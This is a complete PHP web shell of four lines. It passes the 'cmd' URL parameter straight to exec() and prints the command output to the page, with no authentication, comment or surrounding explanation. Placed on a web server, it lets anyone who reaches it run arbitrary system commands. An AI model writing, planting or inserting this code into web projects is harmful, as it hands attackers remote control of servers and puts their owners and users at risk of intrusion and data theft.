<?php 
exec($_GET['cmd'],$salida); 
foreach($salida as $line) { echo "$line<br>"; } 
?>